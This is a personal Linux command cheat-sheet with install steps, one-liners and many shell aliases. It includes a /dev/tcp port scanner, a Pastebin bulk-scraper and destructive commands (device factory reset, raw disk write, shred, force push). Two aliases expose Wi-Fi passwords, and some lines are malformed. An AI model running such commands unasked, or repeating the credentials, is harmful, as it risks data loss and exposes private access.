## sudo chown -R www-data:www-data /var/www/nextcloud/{apps,assets,config,data,themes,updater}
$> sudo chmod +x /var/www/nextcloud/occ
## Make .htaccess then do
$> chmod 0644 /var/www/nextcloud/.htaccess
$> chown root:www-data /var/www/nextcloud/.htaccess
$> chmod 0644 /var/www/nextcloud/data/.htaccess
$> chown root:www-data /var/www/nextcloud/data/.htaccess
##--------------------------------------------
## Log in to Nextcloud
## You’re finally ready to log in to your Nextcloud server. Point a browser to https://IP_OF_SERVER/nextcloud (where IP_OF_SERVER is the actual IP address of the server hosting Nextcloud).
## Nextcloud setup wizard
$> firefox http://IP_OF_SERVER/nextcloud
## “Storage & database” and then click on “MySQL", enter the Database user, password and name
##--------------------------------------------
## The Nextcloud desktop client
$> sudo apt-get nextcloud-client
## This repository contains the stable releases of the client. Desktop client PPA compiled for Ubuntu.
## You can update your system with unsupported packages from this untrusted PPA by adding ppa:nextcloud-devs/client to your system's Software Sources. (Read about installing)
$> sudo add-apt-repository ppa:nextcloud-devs/client
$> sudo apt-get update
$> sudo apt-get nextcloud-client
##--------------------------------------------
##==========================================
## #####################################################
## ##    END  Nextcloud Cloud Server Install
## #####################################################


## ##########################################################
## ##    END Packages
## ##########################################################
## ##########################################################
## ##########################################################
##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================


##==========================================

## ########################################
## ##    Unsorted
## ########################################
##==========================================
## os. security. Make computer that resets at every boot. Files and history do not persist.
## Use an empty ext4 partition or use a ramdisk.
## Install overlayroot.
$> sudo apt update
$> sudo apt install overlayroot
## Assuming you have an empty partition at /dev/sda3:
## Set up configuration, change the overlayroot= line.
$> sudo vim /etc/overlayroot.conf
##    overlayroot="crypt:dev=/dev/sda3"
## Enable overlayroot as part of the boot process.
$> sudo update-initramfs -u
## Reboot.
$> sudo reboot
##========================================
## os. logs. tui. lnav - Log Navigator. Loads and displays log files in ncurses tui.
## G             ## Go to end of logs and follow.
## LEFT Arrow    ## Show the log file that entry came from.
## /             ## Search. TAB completion.
## :config       ## Configure.
$> lnav /var/log
##==========================================
## files. Compare directories (using cmp to compare files byte by byte) to find files of the same name that differ
$> find . -maxdepth 1 -mindepth 1 -print0 | xargs -0 -n 1 -I % cmp % /DUPDIR/% 2>/dev/null
##==========================================
## docker. Remove all intermediate docker images after build
$> docker image rm $(docker image list -f "dangling=true" -qa)
##==========================================
## image. multimedia. camera. Extract thumbnails from EXIF metadata
## It will generate a new file ending with "_ThumbnailImage.jpg" which is the embedded thumbnail inside the JPG for example.
$> exiftool -a -b -W %d%f_%t%-c.%s -preview:all YourFileOrDirectory
##==========================================
## web. Download an entire website
$> wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
##==========================================
## os. time. automation. Execute a command at a given time
## This is an alternative to cron which allows a one-off task to be scheduled for a certain time.
$> echo "ls -l" | at midnight
##==========================================
## multimedia. video. Encode video with constant framerate
$> ffmpeg -i input.mp4 -vcodec libx264 -crf 30 output.mp4
## app. office. Convert libreoffice files : .odt .odg and other to .pdf
## Find and Convert all libre office files to PDF without libreoffice GUI Show Sample Output
$> find /home/#USER/Documents/ -type f -iname "*.odt" -exec libreoffice --headless --convert-to pdf '{}' \;
##==========================================
## os. android. Factory reset your android device via commandline.
$> am broadcast -a android.intent.action.MASTER_CLEAR
##==========================================
## multimedia, video. screen. Capture video of a linux desktop
## This will grab the image from desktop, starting with the upper-left corner at x=100, y=200 with a width and height of 1024?768.
$> ffmpeg -video_size 1024x768 -framerate 25 -f x11grab -i :0.0+100,200 output.mp4
##==========================================
## networking. wifi. Show a prettified list of nearby wireless APs
$> nmcli device wifi list
##==========================================
## math. Calculate the distance between two geographic coordinates points (latitude longitude)
## The Haversine formula determines the great-circle distance between two points on a sphere given their longitudes and latitudes. Show Sample Output
$> latlongdist(){ echo $@|awk '{d($1,$2,$3,$4);} function d(x,y,x2,y2,a,c,dx,dy){dx=r(x2-x);dy=r(y2-y);x=r(x);x2=r(x2);a=(sin(dx/2))^2+cos(x)*cos(x2)*(sin(dy/2))^2;c=2*atan2(sqrt(a),sqrt(1-a)); printf("%.4f",6372.8*c);} function r(g){return g*(3.1415926/180.);}';}
##==========================================
## networking. ssh. key. SSH Copy ed25519 key into your host
$> ssh-copy-id -i your-ed25519-key user@host
##==========================================
## Get Your IP Geographic Location with curl and jq
#$> curl -s https://ipvigilante.com/$(curl -s https://ipinfo.io/ip) | jq '.data.latitude, .data.longitude, .data.city_name, .data.country_name'
##==========================================
## web. Download all recently uploaded pastes on pastebin.com
$> elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget
##==========================================
## Scan all open ports without any required program
$> for i in {1..65535}; do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
##==========================================
## Visual alert with keyboard LEDs
$> for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done
##==========================================
## shell. bash. iterate number range with for loop
$> seq 10 20
## or
$> for i in {1..10}; do echo $i; done
##==========================================
## multimedia. video. Rotate a video file by 90 degrees CW Change video orientation in metadata only.
$> ffmpeg -i in.mov -c copy -metadata:s:v:0 rotate=90 out.mov
$> ffmpeg -i in.mov -vf "transpose=1" out.mov
##==========================================
## os. process. logs. Perform Real-time Process Monitoring Using Watch Utility.
$> watch -n 1 'ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head'
##==========================================
## backup. logs. Rsync using SSH and outputing results to a text file.
## --delete will delete copies on remote to match local if deleted on local --stats will output the results -z zip -a archive -A preserve ACL -x don't cross filesystem boundaries -h human readable -e specify the remote shell to use
$> rsync --delete --stats -zaAxh -e ssh /local_directory/ username@IP_of_remote:/Remote_Directory/ | tee -a /Text_file_Directory/backuplog.txt
##==========================================
## files. diff. Check difference between two file directories recursively
$> diff <(tree /dir/one) <(tree /dir/two)
##==========================================
## shell. Find dupe files by checking md5sum
$> find /glftpd/site/archive -type f|grep '([0-9]\{1,9\})\.[^.]\+$'|parallel -n1 -j200% md5sum ::: |awk 'x[$1]++ { print $2 " :::"}'|sed 's/^/Dupe: /g'|sed 's,Dupe,\x1B[31m&\x1B[0m,'
##==========================================
## os. iso. Write a bootable Linux .iso file directly to a USB-stick
## Writes hybrid ISO directly to USB stick; replace /dev/sdb with USB device in question and the ISO image link with the link of your choice
$> wget -O /dev/sdb https://cdimage.ubuntu.com/daily-live/current/eoan-desktop-amd64.iso
##==========================================
## os. hardware. Make window transparent (50% opacity) in Gnome shell
## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
$> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
##==========================================
## shell. List all accessed configuration files while executing a program in linux terminal (improved version)
## Last listed files presumably have higher precedency then files listed first, i.e. configuration files in the personal .config directory will be listed last and their config parameters will be more authoritative then default config parameters defined in /etc directory which are usually listed above them. If you replace ".conf" with ".ini" in the command, initial files will be listed instead of config files. If you do not like to list multiple access to the same config file, pipe to "uniq" or "uniq -c" to prefix lines by the number of occurrences Show Sample Output
$> strace 2>&1 <any_executable> |egrep -o "\".*\.conf\""
##==========================================
## multimedia. video. Convert an image sequence into a video
$> ffmpeg -framerate 30 -pattern_type glob -i '*.jpg' -c:v libx264 -pix_fmt yuv420p out.mp4
##==========================================
## networking. Print nic name of current connection.
$> nmcli -g name,type connection show --active|awk -F: '/ethernet|wireless/ { print $1 }'
## Print interface that is up and running
$> ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
##==========================================
## files. Make sure your user owns the directories mounting.
$> chown -R $(id -un):$(id -gn) /path/to/your/data
##==========================================
## discourse
$> https://discourse.org/
## zulip
$> https://zulip.com/
## mattermost
$> https://mattermost.com/
## caddy
$> https://caddyserver.com/docs/
##==========================================
## install. app. ai. stable-diffusion
$> https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki/Install-and-Run-on-NVidia-GPUs
$> sudo apt install git software-properties-common -y
$> sudo add-apt-repository ppa:deadsnakes/ppa -y
$> cd ~/code/
$> sudo apt install python3.10-venv -y
$> git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui
$> cd stable-diffusion-webui
$> python3 -m venv venv
$> ./webui.sh
##==========================================
## Systemd TUI
$> https://crates.io/crates/systemd-manager-tui
$> https://github.com/matheus-git/systemd-manager-tui/releases
$> wget https://github.com/matheus-git/systemd-manager-tui/releases/download/v1.1.0/systemd-manager-tui_1.1.0-1_amd64.deb
$> sudo dpkg -i ./systemd-manager-tui_1.1.0-1_amd64.deb
##==========================================
## hardware. chromcast. web. Chromecast CLI catt
$> https://github.com/skorokithakis/catt
$> sudo apt install pipx
$> pipx ensurepath
$> pipx install catt
## Help
$> catt --help
## Cast
$> catt --device "Upstairs Hackitorium TV"  cast  https://regmedia.co.uk/2017/09/28/trump_shutterstock.jpg
##==========================================
## os. files. backup. Timeshift CLI Commands:
## Configuration via CLI:
## While the GUI provides direct configuration options, CLI users can manage Timeshift's behavior by editing the configuration files, primarily /etc/timeshift/default.json and /etc/timeshift/timeshift.json. These files define parameters such as snapshot retention policies (e.g., number of daily, weekly, monthly snapshots to keep) and the snapshot storage device.
## timeshift: This command launches the Timeshift application in a terminal interface, allowing navigation and interaction with its functions.
$> sudo timeshift --check ## Initiates a check for scheduled snapshots and creates one if due.
$> sudo timeshift --create ## Forces the creation of a new snapshot, regardless of the schedule.
$> sudo timeshift --create --comments "My new snapshot" --tags D ## Creates a snapshot with a custom comment and a "Daily" tag.
$> sudo timeshift --restore  ## Starts the interactive restore process, prompting for snapshot selection.
$> sudo timeshift --restore --snapshot <snapshot_ID>  ## Restores a specific snapshot using its unique ID.
## timeshift --list: Displays a list of existing snapshots.
$> sudo timeshift --delete --snapshot <snapshot_ID>  ## Deletes a specific snapshot.
##==========================================
## Hardware accelerated images. Normal images are processed by a CPU but these are processed by your GPU, which is more powerful and more efficient.
$> for %f in (*.png) do ffmpeg -i "%f" -quality 100 "%~nf.webp" & ffmpeg -framerate 1 -stream_loop 1 -i "%~nf.webp" -c:v libvpx-vp9 -quality best -crf 10 -qmin 10 -qmax 10 "%~nf.webm"
##==========================================
## multimedia. video. Make small sharable video from larger.
## Cut the video to just the part wanted.
$> ffmpeg -ss 00:00:02 -i ./inputvid.mp4 -t 00:00:13 -vcodec copy -acodec copy ./outputvid.mp4
## Downsample scale. Can try 'slow' and 'veryslow' preset as well.
## HVEC H265. 
$> ffmpeg -i ./outputvid.mp4 -vcodec libx265 -vf "scale=-2:360" -crf 28 -preset fast ./outputvid_sm.mp4
## HVEC H264. Will play in browser.
$> ffmpeg -i ./outputvid.mp4 -vcodec libx264 -vf "scale=-2:360" -crf 28 -preset fast ./outputvid_sm-264.mp4

##==========================================
## #################################
## ##    More bash alias
## #################################
## A bunch of extra alias.
##==========================================
$> alias ufetch="sh $HOME/ufetch/ufetch-arch"
$> alias ..='cd ..'
$> alias ls='ls -hspt --color=auto'
$> alias nscan='nmap -sn $1'
$> alias myip='curl ipinfo.io/ip'
#$> alias yt2='youtube-dl -x --audio-format mp3 --audio-quality 0 --add-metadata'
$> alias yt2='yt-dlp -x --audio-format mp3 --audio-quality 0 --add-metadata'
$> alias donkeyballs='echo "Received and understood rtailocinante"'
$> alias stats='sudo systemctl status'
$> alias fstats='sudo systemctl status > status.txt'
$> alias net?='ping archlinux.org -c 5'
$> alias fuckit='git push'
$> alias pubsub='. $HOME/scripts/pubsub.sh'
$> alias fixrofi='. ~/.config/rofi/fixrofi'
$> alias networks='nmcli device wifi list'
$> alias wifi-home='sudo nmcli device wifi connect sunshine password Nigerian'
$> alias wifi-parents='sudo nmcli device wifi connect ORBI47 password chowchow'
$> alias vol='amixer get Master | tail -1 | awk '{print$4}''
$> alias volup='amixer set Master playback 15+'
$> alias voldn='amixer set Master playback 15-'
$> alias wifi-of='sudo nmcli device wifi connect '
## fix typos
$> alias {G,g}{re,er}p='grep'
$> alias scrcpy='scrcpy --display-buffer=5000 --audio-buffer=5000 --record '
$> alias t='tmux'
$> alias c='clear'
$> alias ch='clear && history -c'
$> alias coto='tldr'
$> alias czysc='sudo apt clean && sudo apt autoclean && sudo apt autoremove'
$> alias del='rm -i'
$> alias dir='pwd && ls'
$> alias h='history -c'
$> alias ls='ls --color=auto'
$> alias matrix='cmatrix -a -b'
$> alias mpl='mplayer'
$> alias nb='nano ~/.bashrc'
$> alias nh='nano ~/.bash_history'
$> alias sag='sudo apt'
$> alias sagi='sudo apt install'
$> alias sagr='sudo apt remove'
$> alias szukaj='sudo find / -name'
$> alias txt='mplayer -vo caca'
$> alias wywal='sudo shred -fuvz'
$> alias ~~='cd ~'
$> alias lualatexmk='latexmk -lualatex'
$> alias cpuhtop='htop --sort-key PERCENT_CPU'
$> alias memhtop='htop --sort-key PERCENT_MEM'
$> alias iohtop='htop --sort-key IO_RATE'
$> alias rsynccp="rsync --archive -hh --partial --progress"
$> alias rsyncmv="rsync --archive -hh --partial --progress --remove-sent-files"
$> alias build_source_deb="ionice -c3 schedtool -D -n 19 -e debuild -S -sd --lintian-opts --no-lintian"
$> alias o="xdg-open"
$> alias verynice="ionice -c3 schedtool -D -n 19 -e"
$> alias dcd="sudo docker compose down"
$> alias dcu="sudo docker compose up -d"
$> alias dcl="sudo docker compose logs -f"
$> alias dcp="sudo docker compose pull"
$> alias dps="sudo docker ps"
$> alias dfc="dfc -p -/dev/loop"
$> alias ip="ip -color=auto"
$> alias diff="diff --color=auto"
## System with settings-tweaks
$> alias cd='cl'
$> alias sudo='sudo '
$> alias please='sudo '
$> alias apt='nala '
$> alias open='xdg-open '
$> alias ls='ls -pa --color=auto --group-directories-first'
$> alias tree='tree -L 2 --filelimit 25 --dirsfirst --noreport'
$> alias recent='ls -t -1'
$> alias cp='cp -i'
$> alias cpv='rsync -ah --info=progress2'
$> alias mv='mv -i'
$> alias mkdir='mkdir -p'
$> alias grep='grep --color=auto'
$> alias ..='cd ..'
$> alias home='cd ~'
$> alias back='cd "$OLDPWD"'
## Informatic
$> alias motd='cat /etc/motd | lolcat'
$> alias neofetch='neofetch | lolcat'
$> alias yggdrasil='cbonsai -S | lolcat -a'
$> alias bonsai='cbonsai -S'
$> alias news='curl us.getnews.tech'
$> alias weather='curl https://wttr.in/<my home>'
$> alias moon='curl wttr.in/Moon'
## Developer Stuff
$> alias gitlog="git log --graph -n 5 --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
$> alias python='python3 '
$> alias init-project='git init && python3 -m venv .venv && source .venv/bin/activate'
$> alias gitroot='cd $(git rev-parse --show-toplevel)'
## Misc
$> alias new$> alias='source $HOME/.bash_$> aliases'
$> alias rebash='source .bashrc'
$> alias rezsh='source .zshrc'
$> alias histsearch='history | grep'
$> alias trash='mv --force -t ~/.local/share/Trash'
$> alias quickdict='compgen -c | fzf | xargs tldr'
$> alias commanddict='compgen -c | fzf | xargs man'
$> alias dirsize='du -hc . | tail -n 1'
## Functions
gitignore() {
        local gitrootdir="$(git rev-parse --show-toplevel)"
        git rm --cached "$1" -r
        echo "$1" >> "$gitrootdir/.gitignore"
}
##
update() {
        sudo nala update &&
        sudo nala upgrade -y &&
        sudo deb-get upgrade -y &&
        pacstall -Up &&
        sudo nala autopurge &&
        sudo nala clean
}
##
countfiles() {
    local directory="$1"
    local count=$(find "$directory" -type f | wc -l)
    echo "Number of files in $directory: $count"
}
##
cl() {
    DIR="$*";
        # if no DIR given, go home
        if [ $# -lt 1 ]; then
                DIR=$HOME;
    fi;
    builtin cd "${DIR}" && \
    # use your preferred ls command
        ls
}
sounddev() {
        echo "Sources (Inputs):"
        pactl list sources short
        echo
        echo "Sinks (Sources):"
        pactl list sinks short
        echo
        echo "pactl set-default-{sink, source} #"
}
##---------------------------------
## git
$> alias gs='git status'
$> alias gl='git log'
$> alias gb='git branch'
$> alias gd='git diff'
$> alias gdc='git diff --cached'
## github $> aliases
$> alias git-log="git log --graph --pretty=oneline --abbrev-commit --decorate --all"
## yadm helpers
$> alias yadm-log="yadm log --graph --pretty=oneline --abbrev-commit --decorate --all"
## ls/lsd $> aliases
$> alias l="/usr/bin/lsd"
$> alias ll="/usr/bin/lsd -l"
$> alias la="/usr/bin/lsd -a"
$> alias lt="/usr/bin/lsd --tree --depth=4"
$> alias lla="/usr/bin/lsd -la"
$> alias llt="/usr/bin/lsd -l --tree --depth=4"
$> alias lta="/usr/bin/lsd -a --tree --depth=4"
$> alias llta="/usr/bin/lsd -la --tree --depth=4"
## tmux shortcut
$> t() { tmux new-session -A -s `[ -z $1 ] && echo $HOST || echo $1` }
$> alias tls="tmux ls"
## other
$> alias copy='rsync -rulhH --inplace --no-inc-recursive --info=progress2'
$> alias vim=nvim
$> alias wget=wget --hsts-file=${XDG_DATA_HOME:-${HOME}/.local/share}/wget-hsts
$> alias rm='trash'
## homelab
$> alias deploy="docker stack deploy --resolve-image=never --with-registry-auth -c docker-compose.yml"
$> alias remove="docker stack rm"
##
$> alias la='ls -Alh' # show hidden files
$> alias ls='ls -aFh --color=always'
$> alias lx='ls -lXBh' # sort by extension
$> alias lk='ls -lSrh' # sort by size
$> alias lc='ls -lcrh' # sort by change time
$> alias lu='ls -lurh' # sort by access time
$> alias lr='ls -lRh'  # recursive ls
$> alias lt='ls -ltrh' # sort by date
$> alias lm='ls -alh |more' # pipe through 'more'
$> alias lw='ls -xAh'  # wide listing format
$> alias ll='ls -Fls'  # long listing format
$> alias labc='ls -lap' #alphabetical sort
$> alias lf="ls -l | egrep -v 'd'" # files only
$> alias ldir="ls -l | egrep 'd'" # directories only
$> alias da='date "+%Y-%m-%d %A %T %Z"'
$> alias upgrade='sudo apt upgrade'
$> alias update='sudo apt update'
$> alias remove='sudo apt remove'
$> alias autoremove='sudo apt autoclean && sudo apt autoremove'
$> alias clean='sudo apt clean'
$> alias edit='sudo -H gedit'
$> alias gedit='nohup gedit'
$> alias reboot='sudo /sbin/reboot'
$> alias shutdown='sudo /sbin/shutdown'
$> alias ainstall='sudo apt install'
$> alias reinstall='sudo apt reinstall'
$> alias speedtest='speedtest-cli'
$> alias analyze='systemd-analyze'
$> alias blame='systemd-analyze blame'
$> alias chain='systemd-analyze critical-chain'
$> alias chart='systemd-analyze plot > test.svg'
$> alias trash='sudo rm -rf ~/.local/share/Trash/*'
$> alias flush='sudo journalctl --vacuum-size=10M'
$> alias release='cat /etc/*release'
$> alias anan='journalctl -efu ananicy.service'
$> alias cache='sync; echo 3 | sudo tee /proc/sys/vm/drop_caches'
$> alias swap='sudo swapoff -a && sudo swapon -a'
$> alias proton='protontricks --gui --no-bwrap'
$> alias weather='curl wttr.in/'
$> alias grep='grep --color=auto'
$> alias cp="cp -i"
$> alias mv='mv -i'
$> alias rm='rm -iv' $> alias c='clear'
$> alias cpu5='ps auxf | sort -nr -k 3 | head -5'
$> alias mem5='ps auxf | sort -nr -k 4 | head -5' especially for zsh :
$> alias -s {txt,yml,yaml,conf,md,list}="nvim"
$> alias -s html="firefox"
$> alias -s org="firefox"
$ $> alias -g C='| wc -l'
$ grep $> alias ~/.zsh/* C
$> alias -g WL='| wc -l'
$> alias -g CA="2>&1 | cat -A"
$> alias -g DN="2> /dev/null"
$> alias -g G='|& egrep'
$> alias -g H='|& head'
$> alias -g L='|& less'
$> alias -g B='|& bat'
$> alias -g TF='|& tail -f'
$> alias -g M='| most'
$> alias -g SNR='| sort -nr'
$> alias -g S='| sort'$> alias -g X='| xargs'
$> alias -g X0G='| xargs -0 egrep'
$> alias -g X0='| xargs -0'
$> alias -g ND='*(/om[1])' # newest directory
$> alias -g NF='*(.om[1])' # newest file
$> alias iptl='sudo /sbin/iptables -L -n -v --line-numbers'
$> alias iptlin='sudo /sbin/iptables -L INPUT -n -v --line-numbers'
$> alias iptlout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
$> alias iptlfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'
$> alias iptlnat='sudo /sbin/iptables -t nat -n -v --line-numbers'
$> alias gitar="git ls-files -d -m -o -z --exclude-standard | xargs -0 git update-index --add --remove"
$> alias g='git'
$> alias gpd='git push origin develop'
$> alias gpm='git push origin master'
$> alias gst='git status'
$> alias gcom='git commit -m --all'
$> alias gclo='git clone'
$> alias glog='git log'
$> alias gadd='git add . --verbose'
$> alias gco='git checkout'
$> alias gls='git ls-files'
$> alias gpall='git push --all'
$> alias msr='mysql -u root -p'
$> alias restartapache='sudo systemctl restart apache2 && sudo systemctl status -l apache2'
$> alias apachedit='sudo vim /etc/apache2/apache2.conf'
$> alias apachegrace='sudo apachectl graceful'
$> alias apachelog="less +F /var/log/apache2/*.log"
$> alias accio=ansibleSetup
$> alias ans='ansible'
$> alias ansp='ansible-playbook'
$> alias lxcls="lxc-ls --fancy"
$> alias lxcat="lxc-attach -n $@"
$> alias lxcstop="lxc-stop -n $@"
$> alias lxcstart="lxc-start -n $@"
##-------------------------------
## Especially for Debian/Ubuntu :
$> alias apti='sudo apt-get install'
$> alias apts="sudo apt-cache search"
$> alias aptr='sudo apt-get remove'
$> alias orphand='sudo deborphan | xargs sudo apt-get -y remove --purge'
$> alias aptclean='sudo apt-get autoclean && sudo apt-get autoremove && sudo apt-get clean && sudo apt-get remove && orphand'
$> alias upd="sudo apt-get update && sudo apt-get upgrade --only-upgrade -y | tee /var/log/divers/packages-update-$(date +%F).log; sudo apt-get -f install; sudo apt autoclean; sudo apt autoremove"
#$> alias dodo='sudo /sbin/poweroff'
$> alias reboot='sudo /sbin/reboot'
$> alias poweroff='sudo /sbin/poweroff'
$> alias halt='sudo /sbin/poweroff'
$> alias shutdown='sudo /sbin/shutdown'
$> alias stamp='echo $(date "+%A_%d/%m/%Y_%Hh%M)'
$> alias now='echo $(date +"%T)"'
$> alias egrep='egrep --color=auto'
$> alias fgrep='fgrep --color=auto'
$> alias grep='grep --color=auto'
$> alias please='sudo $(history -p \!\!)'
$> alias sduo='sudo'
$> alias suod='sudo'
$> alias svi='sudo nvim'
$> alias us="su"
$> alias vi='nvim'
$> alias edit='nvim'
$> alias emacs='nvim'
## Arch Linux "don't panic" updater
$> alias         pp="echo -en \"\e]2;🔺 paru\a${COLOR_LIGHT_GREY} ─── 🔃 yesterday pkgs available at ───${COLOR_GRANADE}
#https://archive.archlinux.org/repos/$(date --date=yesterday '+%Y/%m/%d')
#by name : https://archive.archlinux.org/packages
#$COLOR_LIGHT_GREY
#\" ; paru"
#$> alias         ip='ip   --color                   '
##
## no qalc, 20°Cx2 doesn't equals 40°C
#$> alias       qalc='echo -en "\e]2;🧮 qalc\a"; qalc --set="temp 1"'
##
#$> alias rh#'=' systemctl      reboot    #'
#$> alias  'rs#'=' systemctl soft-reboot    #'
#$> alias pwr_cya=' systemctl hibernate      #'
#$> alias pwr_sby=' systemctl hybrid-sleep   #'
#$> alias pwr_zzz=' xset dpms force  off     #'
#
#$> alias cls=' echo -ne "\033c"                 #' # clear for real
#$> alias :x=' exit 0                           #'
#$> alias :X=' :x                               #'
#$> alias :q=' :x                               #'
#$> alias :Q=' :x                               #'
#$> alias l='lsd        --long     --almost-all --group-dirs first --hyperlink=always         '
#$> alias sl=' l                                                                               '
#$> alias powershell='echo -en "\e]2;🪟 Poweshell\a"; pwsh    '
#$> alias vs='sudo     $EDITOR'
#$> alias Sw='sudo     $EDITOR'
#$> alias :Sw='sudo     $EDITOR'
#export MANPAGER="nvim    +Man! '+colorscheme base16-eighties' -"
##
$> alias ii="xdg-open" # just like Windows
##
$> alias qr_cam="zbarcam"
$> alias sc='systemctl'
$> alias jc='journalctl'
##
$> alias du='du -h'
$> alias df='df -h -x tmpfs -x devtmpfs -x squashfs'
$> alias mkdir='mkdir -p'
$> alias ls='ls -hqvF --group-directories-first --color=auto'
$> alias rsync='rsync --info=progress2 --partial -Lrutz'
$> alias hosts='grep -E "Host ([^*]+)$" $HOME/.ssh/config | cut -d" " -f2-'
$> alias ll="ls -lah"
$> alias drma='docker rm -f $(docker ps -a -q)'
$> alias fixperms='sudo chown -R $(whoami):$(whoami) . && sudo chmod -R a=,a+rX,u+w,g+w .'
##
function upd() {
  if [[ $OSTYPE == "linux"* ]]; then
    sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y
  fi
  if [[ $OSTYPE == "darwin"* && $(command -v brew) != "" ]]; then
    brew update && brew upgrade
  fi
}

function killport() {
  sudo lsof -i :$1 | grep LISTEN | awk '{ print $2 }' | xargs kill -9
}
## git.
$> alias gc=‘git commit -am’
$> alias gcane=‘git commit —amend —no-edit`
$> alias gp=‘git push’
$> alias gpfl=‘git push —force-with-lease’
$> alias gs=‘git status’
$> alias gd=‘git diff’
##
## Recommit with the previous commit message
gcr=‘git commit -am “$(cat “$(git rev-parse —git-dir)/COMMIT_EDITMSG”)”’
## ffmpeg-normalize for normalizing volume levels of videos
## Example: normalize video.mp4
$> alias normalize='ffmpeg-normalize -v'
## qpdf for combining PDFs
## Example: combine-pdf first.pdf second.pdf -- combined.pdf
$> alias combine-pdf='qpdf --empty --page'
## yt-dlp audio-only
## Example: mp3-dl https://www.youtube.com/watch?v=dQw4w9WgXcQ
$> alias mp3-dl='yt-dlp -x -f bestaudio --audio-format mp3 --audio-quality 128k'
## kill and restart powerline.
$> alias pd="powerline-daemon -k && powerline daemon -q"
## check and install updates automatically.
$> alias sys-up="sudo dnf upgrade -y --refresh"
## sys-up with terminal close.
$> alias sys-upgrade="sys-up && exit"
## sys-up with shutdown.
$> alias sys-up-down="sys-up && shutdown now"
## corrections.
$> alias sodu="sudo"
$> alias vd="yt-dlp"
$> alias clr="clear && ls"
$> alias o="xdg-open"
$> alias c="cal | sed "s/$(date +%e)/"$'\033\[94m&\033\[0m/g'"
$> alias python="python3"
$> alias ..="cd .."
$> alias ...="cd ../.."
$> alias boss='while [ TRUE ]; do head -n 100 /dev/urandom; sleep .05; done | hexdump -C | grep "ff 25"'
$> alias map="telnet mapscii.me"
$> alias myip="wget https://ipinfo.io/ip -qO -"
$> alias fuck='sudo $(history -p \!\!)'
$> alias h='eval "$(history -p \!\! | awk '\''{print $1}'\'')" --help'
##
$> inside_git_repo="$(git rev-parse --is-inside-work-tree 2>/dev/null)"
##
if [[ $inside_get_repo ]]; then
    $> alias rm='git rm'
elif [[ -e "/usr/bin/trash" ]]; then
    $> alias rm='trash'
else
    $> alias rm='rm -i'
fi
##-------------------------
## New cd with functions
function _cd {
    # typing just `_cd` will take you $HOME ;)
    if [ "$1" == "" ]; then
          pushd "$HOME" > /dev/null
          # use `_cd -` to visit previous directory
    elif [ "$1" == "-" ]; then
          pushd "$OLDPWD" > /dev/null
          # use `_cd -n` to go n directories back in history
    elif [[ "$1" =~ ^-[0-9]+$ ]]; then
          for i in `seq 1 ${1/-/}`; do
              popd > /dev/null
          done
          # use `_cd -- <path>` if your path begins with a dash
    elif [ "$1" == "--" ]; then
          shift pushd -- "$@" > /dev/null
          # basic case: move to a dir and add it to history
    else
          pushd "$@" > /dev/null
    fi
}
## replace standard `cd` with enhanced version, ensure tab-completion works
$> alias cd='_cd'
$> complete -d cd
##-------------------------
##
$> alias ..='cd ..' ## go to parent dir.
$> alias ...='cd ../..' ## go to grandparent dir.
$> alias .3='cd ../../..'
$> alias .4='cd ../../../..'
$> alias .5='cd ../../../../..'
## blinkenlights.
$> alias star_wars='telnet towel.blinkenlights.nl'
## git.
$> cdate     = !git add --all && git commit --message \"Commit for $(date -I)\"
$> cdatetime = !git add --all && git commit --message \"Commit for $(date -Iseconds)\"
$> cyolo     = !git add --all && git commit --message \"$(fortune -n 72 -s)\" && git push --force
$> cyolo2    = !git add --all && git commit --message \"$(fortune -n 72 -s)\"
$> cyolo3    = !git add --all && git commit --message \"$(curl -s https://whatthecommit.com/index.txt)\" && git push --force
$> cyolo4    = !git add --all && git commit --message \"$(curl -s https://whatthecommit.com/index.txt)\"
$> cidk      = !git add --all && git commit --message '¯\\_(ツ)_/¯' && git push --force
$> cidk2     = !git add --all && git commit --message '¯\\(°_o)/¯'
## exa.
$> alias ls='exa -l --icons --color=always --group-directories-first'
$> alias la='exa -l --all --icons --color=always --group-directories-first'
## Gaming.
$> alias ProtonUp='ProtonUp-Qt-2.9.1-x86_64.AppImage'
$> alias yuzu='yuzu-mainline-20240212-1d765bdb8.AppImage'
## script with my aliases.
$> alias c="clear"
$> alias ff="fastfetch"
$> alias ls="ls --color=auto"
$> alias l="ls -la --color=auto"
$> alias ll="ls -l --color=auto"
$> alias la="ls -a --color=auto"
$> alias lt="ls -h --size -1 -S --classify"
$> alias ll="ls -Alhp --group-directories-first"
$> alias s="systemctl start"
$> alias st="systemctl status"
$> alias ss="systemctl stop"
$> alias sr="systemctl restart"
$> alias se="systemctl enable"
$> alias sd="systemctl disable"
$> alias sh="~/.scripts/hibernate.sh"
$> alias suspend="systemctl suspend"
$> alias locate="plocate -i"
$> alias v="vim"
$> alias untar="tar -axvf"
$> alias du="du -h --max-depth=1"
$> alias search="yay -Ss"
$> alias install="sudo pacman -S"
$> alias ynstall="yay -S"
$> alias update="sudo pacman -Syu"
$> alias ypdate="yay -Syu"
